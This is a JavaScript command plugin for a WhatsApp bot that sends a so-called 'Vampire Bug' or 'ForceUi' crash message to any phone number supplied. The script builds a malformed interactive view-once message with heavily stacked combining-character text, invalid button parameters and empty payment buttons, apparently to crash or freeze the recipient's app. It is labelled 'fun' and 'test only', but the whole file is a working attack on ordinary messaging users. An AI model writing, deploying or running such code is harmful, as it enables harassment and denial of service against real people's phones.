const { cmd } = require("../lib/command");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const { sleep } = require("../lib/functions");


cmd({
 pattern: "fbug",
 react: "⭕",
 use: ".fbug <number>",
 category: "fun",
 desc: "Send Vampire Bug (test only)",
 filename: __filename
}, async (conn, m, mek, { args, reply }) => {
 if (!args[0]) return reply("⚠️ Use: .forceUi <9477xxxxxxx>");

 let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 await ForceUi(conn, target);
 await reply("✅ ForceUi bug sent to " + target);
});

async function ForceUi(conn, target) {
 try {
 const message = {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: {
 header: {
 title: "𝐘𝐨𝐮 𝐊𝐧𝐨𝐰 𝐑͜͡𝐚᪳𝐧᪳᪳᪳𝐬𝐭͢𝐞͡𝐜͜𝐡͝𝐗͍𝐁͟͜͡𝐮͢͠𝐠͢͡",
 hasMediaAttachment: false
 },
 body: {
 text: ""
 },
 nativeFlowMessage: {
 messageParamsJson: JSON.stringify({
 name: "galaxy_message",
 title: "galaxy_message",
 header: "♞ ꙰⿻ Galaxy ✦ Message ✦",
 body: "Call Galaxy"
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: "♞꙰⿻͠𝐑᪶͜͡𝐚ࣼ𝐧͜͡𝐬͠ 𝐂̶᪶᪳𝐫᪳𝐚᪶᪳𝐬ᷤ𝐡᪶᪳𝐞᪳𝐫᪳͢⿻..."
 },
 {
 name: "call_permission_request",
 buttonParamsJson: "♞꙰⿻͠𝐑᪶͜͡𝐚ࣼ𝐧͜͡𝐬͠ 𝐂̶᪶᪳𝐫᪳𝐚᪶᪳𝐬ᷤ𝐡᪶᪳𝐞᪳𝐫᪳͢⿻..."
 },
 {
 name: "payment_method",
 buttonParamsJson: ""
 },
 {
 name: "payment_status",
 buttonParamsJson: ""
 },
 {
 name: "review_order",
 buttonParamsJson: ""
 }
 ]
 }
 }
 };

 await conn.relayMessage(target, {
 viewOnceMessage: {
 message: message
 }
 }, { messageId: generateMessageID(), userJid: target });

 } catch (err) {
 console.error("❌ Error sending vampire bug:", err);
 }
}




// Optional utility if needed:
function generateMessageID() {
 return "ForceUi" + Math.floor(Math.random() * 999999);
}